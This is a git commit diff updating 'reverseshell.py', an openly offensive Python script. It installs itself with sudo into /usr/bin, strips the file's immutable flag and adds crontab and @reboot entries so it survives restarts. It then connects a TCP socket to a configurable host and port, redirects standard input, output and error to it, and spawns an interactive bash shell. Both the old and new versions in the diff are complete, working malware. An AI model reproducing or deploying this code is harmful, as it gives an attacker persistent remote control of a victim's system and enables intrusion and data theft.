b25898364d98cf66216a46ef40f0ce66fc7217f3
Keyjeek <88333825+Keyj33k@users.noreply.github.com>
2022-04-04 01:52:10 +0200

    Update reverseshell.py

--- reverseshell.py
+++ reverseshell.py
@@ -1,5 +1,8 @@
 #!/usr/bin/env python3
 
+from subprocess import run
+import os 
+
 # # # # # # # # # # # # # # # # # # # # # #
 #                                         #
 #   Author  :   Keyj33k                   #
@@ -7,31 +10,25 @@
 #   Twitter :   @keyjeek                  #
 #   Github  :   @keyj33k                  #
 #   Insta   :   @keyjeek                  #
-#   Version :   1.0.0                     #
+#   Version :   1.0.3                     #
 #                                         #
 # # # # # # # # # # # # # # # # # # # # # # 
-
-from subprocess import run
-import os 
 
 while True:
 
     def __persistence__():
-        import platform
         import time
-        
         os.system('clear')
-        FILE_CHECK = os.path.exists("reverseshell.py")
-        if FILE_CHECK == True:   
-            os.system('sudo mv reverseshell.py /usr/bin')
+        file_exist_check = os.path.exists("reverseshell.py")
+
+        if file_exist_check == True:   
+            os.system('sudo cp reverseshell.py /usr/bin')
             run(f'sudo chattr -i /usr/bin/reverseshell.py', shell=True)
             run(f'echo "30 18 * * * /usr/bin/reverseshell.py" | crontab -e', shell=True)
             run(f'echo "@reboot /usr/bin/reverseshell.py" | tee -a /etc/crontab', shell=True)
-            time.sleep(1.5)
-
-        elif FILE_CHECK == False:  
+            time.sleep(1.25)
+        elif file_exist_check == False:  
             pass
-
         else:
             return __persistence__()
 
@@ -39,22 +36,20 @@ while True:
 
     class shell:
         
-        def __init__(self, TARGET_IPADDRESS, TARGET_PORT):
-            self.TARGET_IPADDRESS = TARGET_IPADDRESS
-            self.TARGET_PORT = TARGET_PORT
+        def __init__(self, target_address, target_port):
+            self.target_address = target_address
+            self.target_port = target_port
             
-    REVERSE_CONNECTION = shell("127.0.0.1", int(5003))
+    reverse_connection = shell("127.0.0.1", int(5003))
     from os import dup2
     import socket
-    
     os.system('clear')
+
     # Change socket.SOCK_STREAM(TCP) to socket.SOCK_DRAM for UDP connection
-    SOCKET_SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    SOCKET_SOCK.connect((REVERSE_CONNECTION.TARGET_IPADDRESS, REVERSE_CONNECTION.TARGET_PORT))
-
-    dup2(SOCKET_SOCK.fileno(),0)
-    dup2(SOCKET_SOCK.fileno(),1)
-    dup2(SOCKET_SOCK.fileno(),2)
-    run(["/bin/bash","-i"])   
-
+    socket_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    socket_sock.connect((reverse_connection.target_address, reverse_connection.target_port))
     
+    dup2(socket_sock.fileno(),0)
+    dup2(socket_sock.fileno(),1)
+    dup2(socket_sock.fileno(),2)
+    run(["/bin/bash","-i"]) 
